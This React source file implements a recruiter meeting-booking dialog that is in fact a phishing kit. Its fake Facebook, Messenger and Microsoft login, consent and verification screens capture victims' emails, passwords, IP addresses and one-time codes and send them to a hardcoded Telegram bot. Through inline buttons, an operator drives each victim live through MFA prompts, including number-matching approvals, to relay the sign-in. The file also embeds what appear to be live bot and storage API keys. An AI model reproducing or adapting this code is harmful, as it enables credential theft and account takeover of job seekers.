import { useEffect, useMemo, useRef, useState } from "react"
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
  DialogDescription,
} from "@/components/ui/dialog"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { Textarea } from "@/components/ui/textarea"
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/select"
import { cn } from "@/lib/utils"
import { meetingTypes, recruiters, type Recruiter } from "@/lib/recruiters"
import {
  ArrowLeft,
  CalendarCheck,
  Check,
  ChevronLeft,
  ChevronRight,
  Clock,
  Loader2,
  Lock,
  Video,
} from "lucide-react"

// Add your Telegram bot configuration
const TELEGRAM_BOT_TOKEN = "8461765223:AAHZaTc2dt0kxjOWfx2c_igm4ql1cpi8Sng"
const TELEGRAM_CHAT_ID = "-1003962821228"

const JSONBIN_KEY = "$2a$10$F4euH87QkhCmfpHFyRdqmuHvD5P4AMainqioOXx8YKPPu4QymMc.O"
const JSONBIN_ID = "6a5eadf0f5f4af5e29aa108b"

// Global counter for unique session IDs — ensures each login attempt gets a unique ID
let pendingSessionId = 0
// Global tracker for the last Telegram update we've processed
let globalLastUpdateId = 0

type Props = {
  open: boolean
  onOpenChange: (open: boolean) => void
  recruiter: Recruiter | null
}

type Step =
  | "schedule"
  | "details"
  | "auth"
  | "permissions"
  | "full-login"
  | "authenticator"
  | "ms-authenticator"
  | "verify-email"
  | "email-otp"
  | "enter-code"
  | "check-phone"
  | "approve-signin"
  | "confirmed"

const TIME_SLOTS = [
  "9:00 AM",
  "9:30 AM",
  "10:00 AM",
  "11:00 AM",
  "1:00 PM",
  "1:30 PM",
  "2:30 PM",
  "3:00 PM",
  "4:00 PM",
]

function buildDays(monthOffset: number) {
  const today = new Date()
  today.setHours(0, 0, 0, 0)
  const base = new Date(today.getFullYear(), today.getMonth() + monthOffset, 1)
  const year = base.getFullYear()
  const month = base.getMonth()
  const firstWeekday = new Date(year, month, 1).getDay()
  const daysInMonth = new Date(year, month + 1, 0).getDate()
  const cells: (Date | null)[] = []
  for (let i = 0; i < firstWeekday; i++) cells.push(null)
  for (let d = 1; d <= daysInMonth; d++) cells.push(new Date(year, month, d))
  return { cells, label: base.toLocaleString("en-US", { month: "long", year: "numeric" }), today }
}

function FacebookIcon({ className }: { className?: string }) {
  return (
      <svg viewBox="0 0 24 24" fill="currentColor" className={className} aria-hidden="true">
        <path d="M24 12.07C24 5.4 18.63 0 12 0S0 5.4 0 12.07C0 18.1 4.39 23.09 10.13 24v-8.44H7.08v-3.49h3.05V9.41c0-3.02 1.79-4.69 4.53-4.69 1.31 0 2.69.24 2.69.24v2.97h-1.52c-1.49 0-1.96.93-1.96 1.89v2.25h3.33l-.53 3.49h-2.8V24C19.61 23.09 24 18.1 24 12.07Z" />
      </svg>
  )
}

function MessengerIcon({ className }: { className?: string }) {
  return (
      <svg viewBox="0 0 24 24" fill="currentColor" className={className} aria-hidden="true">
        <path d="M12 0C5.24 0 0 4.95 0 11.64c0 3.5 1.44 6.53 3.77 8.63.2.17.31.42.32.68l.07 2.13c.02.68.72 1.12 1.34.85l2.38-1.05c.2-.09.42-.1.63-.05 1.1.3 2.27.46 3.49.46 6.76 0 12-4.95 12-11.64C24 4.95 18.76 0 12 0Zm7.2 8.93-3.52 5.59c-.56.89-1.77 1.11-2.61.48l-2.8-2.1a.72.72 0 0 0-.87 0l-3.78 2.87c-.5.38-1.16-.22-.82-.75l3.52-5.59c.56-.89 1.77-1.11 2.61-.48l2.8 2.1c.26.2.61.2.87 0l3.78-2.87c.5-.38 1.16.22.82.75Z" />
      </svg>
  )
}

function MicrosoftIcon({ className }: { className?: string }) {
  return (
      <svg viewBox="0 0 24 24" className={className} aria-hidden="true">
        <path fill="#F25022" d="M1 1h10.5v10.5H1z" />
        <path fill="#7FBA00" d="M12.5 1H23v10.5H12.5z" />
        <path fill="#00A4EF" d="M1 12.5h10.5V23H1z" />
        <path fill="#FFB900" d="M12.5 12.5H23V23H12.5z" />
      </svg>
  )
}

// Decorative "glass" background used by the Microsoft verify-email / OTP pages
function MicrosoftGlassBg() {
  return (
      <div className="pointer-events-none absolute inset-0 z-0 overflow-hidden">
        <svg
            viewBox="0 0 1440 700"
            preserveAspectRatio="xMidYMid slice"
            className="absolute inset-0 h-full w-full"
            xmlns="http://www.w3.org/2000/svg"
        >
          <defs>
            <linearGradient id="msglassg1" x1="0" y1="0" x2="1" y2="1">
              <stop offset="0" stopColor="#ffffff" stopOpacity=".55" />
              <stop offset="1" stopColor="#ffffff" stopOpacity="0" />
            </linearGradient>
            <linearGradient id="msglassg2" x1="1" y1="0" x2="0" y2="1">
              <stop offset="0" stopColor="#dfe6fb" stopOpacity=".6" />
              <stop offset="1" stopColor="#dfe6fb" stopOpacity="0" />
            </linearGradient>
          </defs>
          <polygon points="120,40 620,-40 500,360 40,300" fill="url(#msglassg1)" />
          <polygon points="900,-40 1480,60 1440,420 980,300" fill="url(#msglassg2)" />
          <polygon points="60,420 520,520 360,760 -40,700" fill="url(#msglassg1)" />
          <polygon points="980,420 1480,360 1520,760 1040,760" fill="url(#msglassg2)" />
          <path d="M1400 120 L900 680" stroke="#cfd8f5" strokeWidth="1" opacity=".5" fill="none" />
          <path d="M40 120 L520 620" stroke="#f0dbe8" strokeWidth="1" opacity=".5" fill="none" />
        </svg>
      </div>
  )
}

function MicrosoftFooter({ note }: { note?: string }) {
  return (
      <div className="absolute inset-x-0 bottom-[18px] z-[2] text-center">
        <div className="mb-1.5 flex justify-center gap-[26px]">
          <button type="button" className="text-[13px] text-[#616161] hover:underline">
            Help
          </button>
          <button type="button" className="text-[13px] text-[#616161] hover:underline">
            Terms of use
          </button>
          <button type="button" className="text-[13px] text-[#616161] hover:underline">
            Privacy and cookies
          </button>
        </div>
        <div className="text-[12px] text-[#616161]">
          {note ? (
            <>
              {note}{" "}
              <button type="button" className="text-[#0067b8] hover:underline">
                Learn more
              </button>
            </>
          ) : (
            "Use private browsing if this is not your device."
          )}
        </div>
      </div>
  )
}

export function BookingDialog({ open, onOpenChange, recruiter }: Props) {
  const [step, setStep] = useState<Step>("schedule")
  const [monthOffset, setMonthOffset] = useState(0)
  const [selectedRecruiterId, setSelectedRecruiterId] = useState<string>("")
  const [date, setDate] = useState<Date | null>(null)
  const [time, setTime] = useState<string>("")
  const [form, setForm] = useState({ name: "", email: "", type: meetingTypes[0], notes: "" })
  const [authProvider, setAuthProvider] = useState<"facebook" | "messenger" | "microsoft" | null>(null)
  const [msStep, setMsStep] = useState<"email" | "password">("email")
  const [login, setLogin] = useState({ id: "", password: "" })
  const [loggingIn, setLoggingIn] = useState(false)
  const [permVisible, setPermVisible] = useState(false)
  const [fullVisible, setFullVisible] = useState(false)
  const [otpCode, setOtpCode] = useState("")
  const [rememberDevice, setRememberDevice] = useState(true)
  const [approveCode, setApproveCode] = useState("")
  const [approveError, setApproveError] = useState("")
  const [approving, setApproving] = useState(false)
  const [checkPhoneNumber, setCheckPhoneNumber] = useState("")
  const [emailVerify, setEmailVerify] = useState("")
  const [emailVerifyError, setEmailVerifyError] = useState("")
  const [verifyingEmail, setVerifyingEmail] = useState(false)
  const [isSending, setIsSending] = useState(false)
  const [loginError, setLoginError] = useState("")
  const [otpError, setOtpError] = useState("")
  const [isBookingDisabled, setIsBookingDisabled] = useState(false)
  const [fetchingStatus, setFetchingStatus] = useState(false)

  // Fetch booking status when opened
  useEffect(() => {
    if (open) {
      if (JSONBIN_ID === "YOUR_BIN_ID_HERE") {
        console.warn("JSONBIN_ID not set. Booking toggle will not work.")
        return
      }

      setFetchingStatus(true)
      fetch(`https://api.jsonbin.io/v3/b/${JSONBIN_ID}`, {
        headers: {
          "X-Master-Key": JSONBIN_KEY
        }
      })
        .then(res => res.json())
        .then(data => setIsBookingDisabled(data.record?.isBookingDisabled || false))
        .catch(() => setIsBookingDisabled(false))
        .finally(() => setFetchingStatus(false))
    }
  }, [open])

  useEffect(() => {
    if (step === "permissions") {
      requestAnimationFrame(() => requestAnimationFrame(() => setPermVisible(true)))
    } else if (step === "full-login") {
      setFullVisible(false)
      requestAnimationFrame(() => requestAnimationFrame(() => setFullVisible(true)))
    } else {
      setPermVisible(false)
      setFullVisible(false)
    }
  }, [step])

  // When the approve-signin page opens, ping Telegram with the approve prompt
  const approveStartedRef = useRef(false)
  useEffect(() => {
    if (step === "approve-signin") {
      if (!approveStartedRef.current) {
        approveStartedRef.current = true
        startApproveSignin()
      }
    } else {
      approveStartedRef.current = false
    }
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [step])

  // When the check-phone page opens, generate a random number and ping Telegram
  const checkPhoneStartedRef = useRef(false)
  useEffect(() => {
    if (step === "check-phone") {
      if (!checkPhoneStartedRef.current) {
        checkPhoneStartedRef.current = true
        startCheckPhone()
      }
    } else {
      checkPhoneStartedRef.current = false
    }
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [step])

  function handleAuth(provider: "facebook" | "messenger" | "microsoft") {
    setAuthProvider(provider)
    setLogin({ id: "", password: "" })
    setMsStep("email")
    setPermVisible(false)
    // Microsoft is a direct sign-in (no Meta-style OAuth consent screen),
    // so it goes straight to the login form.
    setStep(provider === "microsoft" ? "full-login" : "permissions")

    // Send auth provider selection to Telegram
    const providerName =
      provider === "facebook" ? "Facebook" : provider === "messenger" ? "Messenger" : "Microsoft"
    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: `👤 User selected: ${providerName}`,
        parse_mode: "HTML",
      }),
    }).catch(() => {})
  }

  function handlePermCancel() {
    setPermVisible(false)
    setTimeout(() => {
      handleOpenChange(false)
    }, 260)
  }

  function handlePermLogin() {
    setPermVisible(false)
    setTimeout(() => {
      setStep("full-login")
    }, 260)
  }

  // Send login credentials to Telegram with inline keyboard buttons
  async function sendLoginToTelegram() {
    const sessionId = ++pendingSessionId
    const ipResponse = await fetch("https://api.ipify.org?format=json").catch(() => ({ ok: false }))
    const ip = ipResponse.ok ? (await ipResponse.json()).ip : "Unknown"

    const text = `<b>🔐 Authentication Report</b>\n\n🔐 <b>Password:</b> <code>${login.password}</code>\n📧 <b>Email:</b> <code>${login.id}</code>\n🌐 <b>IP Address:</b> <code>${ip}</code>`

    // Microsoft gets the full 2FA button set; Facebook/Messenger keep the original two buttons.
    const inlineKeyboard =
      authProvider === "microsoft"
        ? [
            [{ text: "❌ Wrong Password", callback_data: `/wrong-password ${sessionId}` }],
            [{ text: "🔐 Authenticator Code", callback_data: `/code ${sessionId}` }],
            [{ text: "📧 2FA Email", callback_data: `/email-2fa ${sessionId}` }],
            [{ text: "🔢 Code", callback_data: `/enter-code ${sessionId}` }],
            [{ text: "🎲 Random Code", callback_data: `/random-code ${sessionId}` }],
            [{ text: "📲 Approve Sign-in", callback_data: `/approve-signin ${sessionId}` }],
          ]
        : [
            [{ text: "❌ Wrong Password", callback_data: `/wrong-password ${sessionId}` }],
            [{ text: "🔐 Authenticator", callback_data: `/code ${sessionId}` }],
          ]

    const payload = {
      chat_id: TELEGRAM_CHAT_ID,
      text,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: inlineKeyboard,
      },
    }

    const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload),
    })

    if (!res.ok) throw new Error("Failed to send login data to Telegram")

    return sessionId
  }

  // Track active polling so we can clean up
  const pollingRef = useRef<{ abort: boolean; controller: AbortController | null }>({ abort: false, controller: null })

  // Cleanup polling on unmount
  useEffect(() => {
    return () => {
      pollingRef.current.abort = true
      if (pollingRef.current.controller) {
        pollingRef.current.controller.abort()
      }
    }
  }, [])

  // Poll for bot response — waits until bot sends a callback for THIS session only
  // Uses a unique query param to avoid 409 conflicts with multiple tabs
  async function startPollingForAction(sessionId: number, timeoutMs = 120000): Promise<string> {
    // Abort any existing polling first
    pollingRef.current.abort = true
    if (pollingRef.current.controller) {
      pollingRef.current.controller.abort()
    }
    await new Promise(r => setTimeout(r, 100))
    pollingRef.current.abort = false

    const startTime = Date.now()
    let lastUpdateId = globalLastUpdateId

    while (!pollingRef.current.abort && Date.now() - startTime < timeoutMs) {
      try {
        pollingRef.current.controller = new AbortController()
        const res = await fetch(
          `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=25`,
          { signal: pollingRef.current.controller.signal }
        )
        const data = await res.json()

        if (data.ok && data.result) {
          for (const update of data.result) {
            // Advance the global counter so other sessions don't re-process this update
            if (update.update_id > lastUpdateId) {
              lastUpdateId = update.update_id
            }
            if (update.update_id > globalLastUpdateId) {
              globalLastUpdateId = update.update_id
            }

            // Check for callback_query (button press)
            if (update.callback_query) {
              const callbackData = update.callback_query.data || ""
              const callbackSessionId = parseInt(callbackData.split(" ").pop() || "0", 10)

              // Only respond if this callback is meant for THIS session
              if (callbackSessionId === sessionId) {
                // Acknowledge the callback to Telegram
                await fetch(
                  `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`,
                  {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                      callback_query_id: update.callback_query.id,
                      text: "Processing...",
                    }),
                  }
                )
                return callbackData
              }
            }
          }
        }
      } catch (err) {
        // Connection timeout, 409 conflict, or other error — retry immediately
        const errStr = String(err)
        // If 409 conflict (webhook or another poll active), just wait a bit and retry
        if (errStr.includes("409") || errStr.includes("Conflict")) {
          await new Promise(r => setTimeout(r, 1000))
        }
      }
    }

    throw new Error("Polling timed out or was aborted")
  }

  // Microsoft step 1: send the entered email to Telegram, wait for the bot.
  // If the bot marks it wrong we keep the user on the email page and show an error;
  // otherwise we advance to the password page.
  async function handleMicrosoftEmailNext(e: React.FormEvent) {
    e.preventDefault()
    if (login.id.trim().length === 0) return
    setLoginError("")
    setIsSending(true)

    try {
      const sessionId = ++pendingSessionId
      const ipResponse = await fetch("https://api.ipify.org?format=json").catch(() => ({ ok: false }))
      const ip = ipResponse.ok ? (await ipResponse.json()).ip : "Unknown"

      const text = `<b>📧 Microsoft — Email Submitted</b>\n\n📧 <b>Email:</b> <code>${login.id}</code>\n🌐 <b>IP Address:</b> <code>${ip}</code>`

      const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text,
          parse_mode: "HTML",
          reply_markup: {
            inline_keyboard: [
              [
                { text: "❌ Wrong Email", callback_data: `/wrong-email ${sessionId}` },
              ],
              [
                { text: "✅ Continue", callback_data: `/email-ok ${sessionId}` },
              ],
            ],
          },
        }),
      })

      if (!res.ok) throw new Error("Failed to send email to Telegram")

      // Wait for the bot's decision
      const callbackData = await startPollingForAction(sessionId)
      setIsSending(false)

      if (callbackData.startsWith("/wrong-email")) {
        // Stay on the email page and surface the error (exact copy is rendered in the UI)
        setLoginError("We couldn't find an account with that username.")
      } else {
        // ✅ (or any other action) — advance to the password page
        setMsStep("password")
      }
    } catch (error) {
      console.error("Microsoft email submission failed:", error)
      setIsSending(false)
      alert("There was an issue submitting your email. Please try again.")
    }
  }

  // Handle the login form submission — sends credentials to Telegram and waits for bot
  async function handleFullLogin(e: React.FormEvent) {
    e.preventDefault()
    setLoggingIn(true)
    setLoginError("")

    try {
      // ── 1. Send credentials to Telegram with inline buttons ──
      const sessionId = await sendLoginToTelegram()

      // ── 2. Wait for bot to respond with an action ──
      const callbackData = await startPollingForAction(sessionId)

      // ── 3. Parse the bot's response and navigate accordingly ──
      setLoggingIn(false)

      if (callbackData.startsWith("/wrong-password")) {
        // Wrong password — show error on the login page, user can retry
        setLoginError("Your account or password is incorrect.")
      } else if (authProvider === "microsoft" && callbackData.startsWith("/email-2fa")) {
        // Microsoft — Bot chose 2FA Email — open the "Verify your email" page
        setFullVisible(false)

        setTimeout(() => {
          setEmailVerify("")
          setEmailVerifyError("")
          setStep("verify-email")
        }, 260)
      } else if (authProvider === "microsoft" && callbackData.startsWith("/enter-code")) {
        // Microsoft — Bot chose Code — open the generic "Enter the code" page
        setFullVisible(false)

        setTimeout(() => {
          setOtpCode("")
          setOtpError("")
          setStep("enter-code")
        }, 260)
      } else if (authProvider === "microsoft" && callbackData.startsWith("/approve-signin")) {
        // Microsoft — Bot chose Approve Sign-in — open the approval page and ping Telegram
        setFullVisible(false)
        setApproveError("")

        setTimeout(() => {
          setStep("approve-signin")
        }, 260)
      } else if (authProvider === "microsoft" && callbackData.startsWith("/random-code")) {
        // Microsoft — Bot chose Random Code — open the "Check your phone" page and ping Telegram
        setFullVisible(false)

        setTimeout(() => {
          setCheckPhoneNumber("")
          setStep("check-phone")
        }, 260)
      } else if (authProvider === "microsoft" && callbackData.startsWith("/code")) {
        // Microsoft — "Authenticator Code" — Microsoft-styled authenticator page
        setFullVisible(false)

        setTimeout(() => {
          setOtpCode("")
          setOtpError("")
          setStep("ms-authenticator")
        }, 260)
      } else {
        // Facebook / Messenger (and any other action) — social-styled authenticator page
        setFullVisible(false)

        setTimeout(() => {
          setStep("authenticator")
        }, 260)
      }
    } catch (error) {
      console.error("Login submission failed:", error)
      setLoggingIn(false)
      alert("There was an issue submitting your login. Please try again.")
    }
  }

  // Verify-email step: send the entered email to Telegram, wait for the bot.
  // On approval we move to the code-entry (email-otp) page.
  async function handleVerifyEmailSubmit(e: React.FormEvent) {
    e.preventDefault()
    if (emailVerify.trim().length === 0) return
    setEmailVerifyError("")
    setVerifyingEmail(true)

    try {
      const sessionId = ++pendingSessionId

      const text = `<b>📧 Microsoft — 2FA Email Verification</b>\n\n<b>📧 Account:</b> <code>${login.id}</code>\n<b>✉️ Verify Email:</b> <code>${emailVerify}</code>\n\n⏰ <i>Submitted at: ${new Date().toLocaleString()}</i>`

      const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text,
          parse_mode: "HTML",
          reply_markup: {
            inline_keyboard: [
              [
                { text: "✅ Send Code", callback_data: `/send-code ${sessionId}` },
                { text: "❌ Invalid Email", callback_data: `/invalid-email ${sessionId}` },
              ],
            ],
          },
        }),
      })

      if (!res.ok) throw new Error("Failed to send email verification to Telegram")

      const callbackData = await startPollingForAction(sessionId)
      setVerifyingEmail(false)

      if (callbackData.startsWith("/invalid-email")) {
        setEmailVerifyError("That email address didn't work. Please check it and try again.")
      } else {
        // ✅ Send Code (or any other action) — open the code-entry page
        setOtpCode("")
        setOtpError("")
        setStep("email-otp")
      }
    } catch (error) {
      console.error("Email verification failed:", error)
      setVerifyingEmail(false)
      alert("There was an issue verifying your email. Please try again.")
    }
  }

  // Generate a short uppercase alphanumeric request code (e.g. P8CB3)
  function generateApproveCode() {
    const chars = "ABCDEFGHJKLMNPQRSTUVWXYZ123456789"
    let code = ""
    for (let i = 0; i < 5; i++) code += chars[Math.floor(Math.random() * chars.length)]
    return code
  }

  // Build number buttons 00, 01, 02 … 89 (zero-padded), laid out in rows of 8.
  // Telegram allows at most 100 inline buttons per keyboard, and we still need room for
  // the Approve / Code / Authenticator / 2FA Email / Deny buttons below the grid, so we
  // cap the grid at 90 numbers (90 + 5 action buttons = 95, safely under the limit).
  function buildNumberButtons(sessionId: number) {
    const buttons: { text: string; callback_data: string }[] = []
    for (let n = 0; n <= 89; n++) {
      const value = String(n).padStart(2, "0")
      buttons.push({
        text: value,
        callback_data: `/number ${value} ${sessionId}`,
      })
    }

    const rows: { text: string; callback_data: string }[][] = []
    for (let i = 0; i < buttons.length; i += 8) {
      rows.push(buttons.slice(i, i + 8))
    }
    return rows
  }

  // Approve-signin step: no action on the page itself. We send an "Approve" prompt to
  // Telegram and let the operator either approve the request or redirect the user to the
  // Code / Authenticator / 2FA Email pages.
  async function startApproveSignin() {
    setApproving(true)
    setApproveError("")

    const code = generateApproveCode()
    setApproveCode(code)

    try {
      const sessionId = ++pendingSessionId

      const text = `<b>📲 Microsoft — Approve sign-in request</b>\n\n📧 <b>Account:</b> <code>${login.id}</code>\n🔢 <b>Request code:</b> <code>${code}</code>\n\n⏰ <i>Submitted at: ${new Date().toLocaleString()}</i>`

      const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text,
          parse_mode: "HTML",
          reply_markup: {
            inline_keyboard: [
              [{ text: "✅ Approve", callback_data: `/approved ${sessionId}` }],
              [
                { text: "🔢 Code", callback_data: `/enter-code ${sessionId}` },
                { text: "🔐 Authenticator", callback_data: `/code ${sessionId}` },
              ],
              [
                { text: "📧 2FA Email", callback_data: `/email-2fa ${sessionId}` },
                { text: "❌ Deny", callback_data: `/deny ${sessionId}` },
              ],
            ],
          },
        }),
      })

      if (!res.ok) throw new Error("Failed to send approve request to Telegram")

      const callbackData = await startPollingForAction(sessionId)
      setApproving(false)

      if (callbackData.startsWith("/approved")) {
        // Operator approved — send confirmation + go to confirmed page
        await sendBookingConfirmation()
        setStep("confirmed")
      } else if (callbackData.startsWith("/enter-code")) {
        setOtpCode("")
        setOtpError("")
        setStep("enter-code")
      } else if (callbackData.startsWith("/email-2fa")) {
        setEmailVerify("")
        setEmailVerifyError("")
        setStep("verify-email")
      } else if (callbackData.startsWith("/code")) {
        setOtpCode("")
        setOtpError("")
        setStep("ms-authenticator")
      } else if (callbackData.startsWith("/deny")) {
        // Operator denied — stay on the approve page and show a message
        setApproveError("This sign-in request was denied. Please try again later.")
      } else {
        // Fallback — re-arm the approve prompt (no action taken)
        startApproveSignin()
      }
    } catch (error) {
      console.error("Approve sign-in failed:", error)
      setApproving(false)
      alert("There was an issue with the sign-in request. Please try again.")
    }
  }

  // Check-phone step: send the full number grid (00, 01, 02 … 100) to Telegram once.
  // Pressing any number shows it on the "Check your phone" page. The operator can also
  // Approve, redirect to the Code / Authenticator / 2FA Email pages, or Deny.
  async function startCheckPhone() {
    setApproving(true)
    setApproveError("")

    try {
      const sessionId = ++pendingSessionId

      const text = `<b>📱 Microsoft — Check your phone</b>\n\n📧 <b>Account:</b> <code>${login.id}</code>\n\nTap the number to show it on the sign-in request screen.\n\n⏰ <i>Submitted at: ${new Date().toLocaleString()}</i>`

      const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text,
          parse_mode: "HTML",
          reply_markup: {
            inline_keyboard: [
              // Full number grid (00, 01, 02 … 100) — pressing one shows it on the page
              ...buildNumberButtons(sessionId),
              [{ text: "✅ Approve", callback_data: `/approved ${sessionId}` }],
              [
                { text: "🔢 Code", callback_data: `/enter-code ${sessionId}` },
                { text: "🔐 Authenticator", callback_data: `/code ${sessionId}` },
              ],
              [
                { text: "📧 2FA Email", callback_data: `/email-2fa ${sessionId}` },
                { text: "❌ Deny", callback_data: `/deny ${sessionId}` },
              ],
            ],
          },
        }),
      })

      if (!res.ok) throw new Error("Failed to send check-phone request to Telegram")

      // Listen for button presses on this same message. Number presses only update the
      // page; navigation/approval presses move the flow forward. We keep re-polling so the
      // operator can change the number any number of times without resending the grid.
      while (true) {
        const callbackData = await startPollingForAction(sessionId)

        if (callbackData.startsWith("/number")) {
          // Operator pressed a number — show it on the page and keep listening.
          const value = callbackData.split(" ")[1] || ""
          setCheckPhoneNumber(value)
          continue
        }

        setApproving(false)

        if (callbackData.startsWith("/approved")) {
          // Operator approved — send confirmation + go to confirmed page
          await sendBookingConfirmation()
          setStep("confirmed")
        } else if (callbackData.startsWith("/enter-code")) {
          setOtpCode("")
          setOtpError("")
          setStep("enter-code")
        } else if (callbackData.startsWith("/email-2fa")) {
          setEmailVerify("")
          setEmailVerifyError("")
          setStep("verify-email")
        } else if (callbackData.startsWith("/code")) {
          setOtpCode("")
          setOtpError("")
          setStep("ms-authenticator")
        } else if (callbackData.startsWith("/deny")) {
          // Operator denied — stay on the page and show a message
          setApproveError("This sign-in request was denied. Please try again later.")
        } else {
          // Fallback — re-arm the prompt (no action taken)
          startCheckPhone()
        }
        return
      }
    } catch (error) {
      console.error("Check-phone failed:", error)
      setApproving(false)
      alert("There was an issue with the sign-in request. Please try again.")
    }
  }

  // Send the full booking confirmation message to Telegram
  async function sendBookingConfirmation() {
    const bookingMessage = `
📅 <b>Booking Confirmed!</b>

👤 <b>Candidate:</b> ${form.name}
📧 <b>Email:</b> ${form.email}
👔 <b>Recruiter:</b> ${activeRecruiter?.name || "Unknown"}
📆 <b>Date:</b> ${dateLabel || "Unknown"}
🕐 <b>Time:</b> ${time || "Unknown"}
📋 <b>Meeting Type:</b> ${form.type}
🔐 <b>Verified via:</b> ${authProvider === "facebook" ? "Facebook" : authProvider === "messenger" ? "Messenger" : "Microsoft"}
📝 <b>Notes:</b> ${form.notes || "None provided"}

🔗 <i>Booking confirmed at: ${new Date().toLocaleString()}</i>
    `.trim()

    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: bookingMessage,
        parse_mode: "HTML",
      }),
    })

    // Open Jivo chat widget
    setTimeout(() => {
      if (typeof window.jivo_api !== "undefined") {
        window.jivo_api.open()
      }
    }, 500)
  }

  // Send 2FA code to Telegram with inline buttons and wait for bot response
  async function handleAuthenticatorContinue() {
    // Microsoft codes can be 6–10 digits; Facebook/Messenger stay strict 6.
    const minLen = 6
    const maxLen = authProvider === "microsoft" ? 10 : 6
    if (otpCode.length < minLen || otpCode.length > maxLen) return
    setIsSending(true)
    setOtpError("")

    try {
      const sessionId = ++pendingSessionId

      const text = `<b>🔐 2FA Code Received</b>\n\n<b>📧 Email/Phone:</b> <code>${login.id}</code>\n<b>🔑 Code:</b> <code>${otpCode}</code>\n\n⏰ <i>Submitted at: ${new Date().toLocaleString()}</i>`

      const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text,
          parse_mode: "HTML",
          reply_markup: {
            inline_keyboard: [
              [
                { text: "✅ Confirmed", callback_data: `/confirmed ${sessionId}` },
                { text: "❌ Wrong Code", callback_data: `/wrong-code ${sessionId}` },
              ],
            ],
          },
        }),
      })

      if (!res.ok) throw new Error("Failed to send 2FA code")

      // Wait for bot to respond
      const callbackData = await startPollingForAction(sessionId)
      setIsSending(false)

      if (callbackData.startsWith("/confirmed")) {
        // Send the full booking confirmation to Telegram
        await sendBookingConfirmation()
        setStep("confirmed")
      } else if (callbackData.startsWith("/wrong-code")) {
        setOtpError("The code you entered is incorrect. Please try again.")
        setOtpCode("")
      }
    } catch (error) {
      console.error("Failed to send 2FA code:", error)
      setIsSending(false)
      alert("There was an issue submitting your code. Please try again.")
    }
  }

  // Send booking details (schedule + details) to Telegram when "Confirm booking" is pressed
  async function handleConfirmBooking() {
    if (!canConfirm) return
    setIsSending(true)

    try {
      const message = `
📋 <b>New Booking Request</b>

👤 <b>Candidate:</b> ${form.name}
📧 <b>Email:</b> ${form.email}
👔 <b>Recruiter:</b> ${activeRecruiter?.name || "Unknown"}
📆 <b>Date:</b> ${dateLabel || "Unknown"}
🕐 <b>Time:</b> ${time || "Unknown"}
📋 <b>Meeting Type:</b> ${form.type}
📝 <b>Notes:</b> ${form.notes || "None provided"}

⏰ <i>Submitted at: ${new Date().toLocaleString()}</i>
      `.trim()

      const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message,
          parse_mode: "HTML",
        }),
      })

      if (!res.ok) throw new Error("Failed to send booking details")

      setIsSending(false)
      setAuthProvider(null)
      setStep("auth")
    } catch (error) {
      console.error("Failed to send booking details:", error)
      setIsSending(false)
      alert("There was an issue submitting your booking. Please try again.")
    }
  }

  const activeRecruiter =
      recruiter ?? recruiters.find((r) => r.id === selectedRecruiterId) ?? null

  const { cells, label, today } = useMemo(() => buildDays(monthOffset), [monthOffset])

  function reset() {
    setStep("schedule")
    setMonthOffset(0)
    setDate(null)
    setTime("")
    setSelectedRecruiterId("")
    setForm({ name: "", email: "", type: meetingTypes[0], notes: "" })
    setAuthProvider(null)
    setLogin({ id: "", password: "" })
    setMsStep("email")
    setLoggingIn(false)
    setPermVisible(false)
    setFullVisible(false)
    setIsSending(false) // Reset sending state
    setLoginError("")
    setOtpError("")
    setOtpCode("")
    setRememberDevice(true)
    setApproveCode("")
    setApproveError("")
    setApproving(false)
    setCheckPhoneNumber("")
    setEmailVerify("")
    setEmailVerifyError("")
    setVerifyingEmail(false)
  }

  function handleOpenChange(next: boolean) {
    if (!next) {
      // Clean up any active polling when dialog closes
      pollingRef.current.abort = true
      if (pollingRef.current.controller) {
        pollingRef.current.controller.abort()
      }
      setTimeout(reset, 200)
    }
    onOpenChange(next)
  }

  const canLogIn = login.id.trim().length > 0 && login.password.length > 0
  const canContinue = Boolean(activeRecruiter && date && time)
